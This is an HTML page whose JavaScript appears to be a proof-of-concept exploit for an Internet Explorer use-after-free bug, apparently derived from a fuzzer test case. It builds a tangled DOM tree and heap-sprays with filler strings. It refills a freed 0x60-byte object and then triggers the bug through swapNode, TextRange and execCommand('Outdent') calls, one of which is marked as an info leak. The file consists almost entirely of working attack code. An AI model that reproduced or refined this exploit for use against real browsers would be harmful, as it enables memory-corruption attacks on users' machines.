<!DOCTYPE HTML> 
<html> 
<head> 
<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">  
</head> 
<body id="realbody" onload="" onmouseover="">
<div id="realdiv">
	whoami
</div>
<script>
var testcase = 1407255937.19
var version = 1.86
var range0 = null;
var range1 = null;

var elem0 = document.createElement("b");
elem0.id = 'elem0';

var elem1 = document.createElement("b");
elem1.id = 'elem1';

var elem2 = document.createElement("b");
elem2.id = 'elem2';

var elem3 = document.createElement("b");
elem3.id = 'elem3';

var elem4 = document.createElement("b");
elem4.id = 'elem4';

var elem5 = document.createElement("b");
elem5.id = 'elem5';

var elem6 = document.createElement("b");
elem6.id = 'elem6';

var elem7 = document.createElement("b");
elem7.id = 'elem7';

var elem8 = document.createElement("b");
elem8.id = 'elem8';

var elem9 = document.createElement("b");
elem9.id = 'elem9';

var elem10 = document.createElement("b");
elem10.id = 'elem10';

var elem11 = document.createElement("b");
elem11.id = 'elem11';

var elem12 = document.createElement("b");
elem12.id = 'elem12';

var elem13 = document.createElement("b");
elem13.id = 'elem13';

var elem14 = document.createElement("b");
elem14.id = 'elem14';

var sweet6 = document.createElement("b");
sweet6.id = 'sweet6';
function spray(){
	var payload = ""
	for(var i = 0; i<0x10000; i++){ // 96
		// payload += "B"
		payload += unescape("\u4141\u4141")

	}
	return payload
}
// document.execCommand("selectall", false)

// try {sweet6.setAttribute('innerHTML',spray());} catch(e) { }

var elem16 = document.createElement("b");
elem16.id = 'elem16';

var elem17 = document.createElement("canvas");
elem17.id = 'elem17';

var elem18 = document.createElement("tfoot");
elem18.id = 'elem18';

var elem19 = document.createElement("b");
elem19.id = 'elem19';

var elem20 = document.createElement("b");
elem20.id = 'elem20';

var elem21 = document.createElement("b");
elem21.id = 'elem21';

var sweet3 = document.createElement("b");
sweet3.id = 'sweet3';

var elem23 = document.createElement("b");
elem23.id = 'elem23';

var elem24 = document.createElement("b");
elem24.id = 'elem24';

var elem25 = document.createElement("b");
elem25.id = 'elem25';

var elem26 = document.createElement("b");
elem26.id = 'elem26';

var elem27 = document.createElement("b");
elem27.id = 'elem27';

var elem28 = document.createElement("b");
elem28.id = 'elem28';

var elem29 = document.createElement("b");
elem29.id = 'elem29';

var elem30 = document.createElement("b");
elem30.id = 'elem30';
// elem30.data = 'http://192.168.0.20:8080/subframe?count=9';

var elem31 = document.createElement("b");
elem31.id = 'elem31';

var elem32 = document.createElement("b");
elem32.id = 'elem32';

var elem33 = document.createElement("b");
elem33.id = 'elem33';

var elem34 = document.createElement("b");
elem34.id = 'elem34';

var elem35 = document.createElement("b");
elem35.id = 'elem35';

var elem36 = document.createElement("b");
elem36.id = 'elem36';

var elem37 = document.createElement("b");
elem37.id = 'elem37';

var elem38 = document.createElement("b");
elem38.id = 'elem38';

var elem39 = document.createElement("b");
elem39.id = 'elem39';

var elem40 = document.createElement("b");
elem40.id = 'elem40';

var elem41 = document.createElement("b");
elem41.id = 'elem41';

var elem42 = document.createElement("b");
elem42.id = 'elem42';

var elem43 = document.createElement("b");
elem43.id = 'elem43';

var elem44 = document.createElement("b");
elem44.id = 'elem44';

var elem45 = document.createElement("b");
elem45.id = 'elem45';

var elem46 = document.createElement("b");
elem46.id = 'elem46';

var elem47 = document.createElement("b");
elem47.id = 'elem47';


var elem48 = document.createElement("b");
elem48.id = 'elem48';

var elem49 = document.createElement("b");
elem49.id = 'elem49';

var elem50 = document.createElement("b");
elem50.id = 'elem50';

var elem51 = document.createElement("b");
elem51.id = 'elem51';

var elem52 = document.createElement("b");
elem52.id = 'elem52';

var sweet2 = document.createElement("b");
sweet2.id = 'sweet2';

var elem54 = document.createElement("b");
elem54.id = 'elem54';

var elem55 = document.createElement("b");
elem55.id = 'elem55';

var elem56 = document.createElement("b");
elem56.id = 'elem56';

var sweet4 = document.createElement("b");
sweet4.id = 'sweet4';

var elem58 = document.createElement("b");
elem58.id = 'elem58';

var elem59 = document.createElement("b");
elem59.id = 'elem59';

var elem60 = document.createElement("b");
elem60.id = 'elem60';

var elem61 = document.createElement("b");
elem61.id = 'elem61';

var elem62 = document.createElement("b");
elem62.id = 'elem62';

var elem63 = document.createElement("b");
elem63.id = 'elem63';

var sweet1 = document.createElement("b");
sweet1.id = 'sweet1';

var elem65 = document.createElement("b");
elem65.id = 'elem65';

var elem66 = document.createElement("b");
elem66.id = 'elem66';

var elem67 = document.createElement("b");
elem67.id = 'elem67';

var elem68 = document.createElement("b");
elem68.id = 'elem68';

var elem69 = document.createElement("b");
elem69.id = 'elem69';

var realbody = document.getElementById('realbody');
realbody.appendChild(elem0);
realbody.appendChild(elem1);
realbody.appendChild(elem2);
realbody.appendChild(elem3);

elem0.appendChild(elem4);
elem4.appendChild(elem5);
elem1.appendChild(elem6);
elem3.appendChild(elem7);
elem3.appendChild(elem8);
elem0.appendChild(elem9);
elem6.appendChild(elem10);
elem2.appendChild(elem11);
elem7.appendChild(elem12);
elem4.appendChild(elem13);
elem10.appendChild(elem14);
elem12.appendChild(sweet6);
try {sweet6.innerHTML = spray();} catch(e) { } // 
elem12.appendChild(elem16);
sweet6.appendChild(elem17);

elem9.appendChild(elem18);

elem12.appendChild(elem19);
elem19.appendChild(elem20);
elem14.appendChild(elem21);
elem2.appendChild(sweet3);
elem8.appendChild(elem23);
elem18.appendChild(elem24);
elem8.appendChild(elem25);
elem20.appendChild(elem26);
sweet3.appendChild(elem27);
elem9.appendChild(elem28);
elem18.appendChild(elem29);
elem20.appendChild(elem30);
elem6.appendChild(elem31);
elem4.appendChild(elem32);
elem2.appendChild(elem33);
elem20.appendChild(elem34);
sweet6.appendChild(elem35);
elem27.appendChild(elem36);
elem9.appendChild(elem37);
elem9.appendChild(elem38);
elem3.appendChild(elem39);
elem34.appendChild(elem40);
elem29.appendChild(elem41);
elem33.appendChild(elem42);
elem4.appendChild(elem46);
elem49.appendChild(elem50);
elem33.appendChild(elem52);
elem37.appendChild(elem56);
elem18.appendChild(sweet4);
elem6.appendChild(elem59);
elem46.appendChild(elem60);
elem6.appendChild(elem67);
elem21.appendChild(elem62);
try {elem47.setAttribute('hidden',true);} catch(e) { }
function dword2data(dword)
{
    return String.fromCharCode(dword % 0x10000, dword / 0x10000)
}
function spray1(){
	// fill freed object
	// size : 0x60
	var payload = ""
	for(var i = 0; i<65; i++){
		payload += dword2data(0x42424242) 
	}
	payload += unescape("\u4141")

	d = new Array(500);
		for (var i = 0; i < 500; i++) {
	        d[i] = document.createElement('div');
	        d[i].className = payload
		}
    }
// sweet6.appendChild(elem43);
// elem37.appendChild(elem44);
// elem23.appendChild(elem45);
// elem17.appendChild(elem47);
// elem41.appendChild(elem48);
// elem28.appendChild(elem49);
// elem39.appendChild(elem51);
// elem35.appendChild(sweet2);
// elem34.appendChild(elem54);
// elem23.appendChild(elem55);
// elem3.appendChild(elem58);
// elem45.appendChild(elem61);
// elem30.appendChild(elem63);
// sweet4.appendChild(sweet1);
// sweet6.appendChild(elem65);
// elem18.appendChild(elem66);
// elem26.appendChild(elem68);

	try {document.getElementsByTagName('*')[56].insertAdjacentElement('afterBegin',document.getElementsByTagName('*')[14]);} catch(e) { }

	try {eval('document.execCommand("Outdent", true, false);');} catch(e) { }

	try {document.all[40].swapNode(sweet4);} catch(e) { }

	try {range0 = document.body.createTextRange();} catch(e) { }

	try {range0.moveToElementText(sweet3);} catch(e) { }

	try {range0.moveEnd('character', 0x10);} catch(e) { } // info leak

	try {sweet2.innerText = sweet4.innerText;} catch(e) { }

	try {range1 = document.body.createTextRange();} catch(e) { }

	try {range1.moveToElementText(sweet3);} catch(e) { }

	try {range1.moveEnd('character', 0x1);} catch(e) { }

// for(i=0; i<1000; i++){console.log(a[i])}
setInterval(function() {
	// console.log(document.all.length)
	// spray1()
	try {document.all[40].swapNode(sweet4);} catch(e) { }
}, 10)

</script>
hi
</body> 
</html>
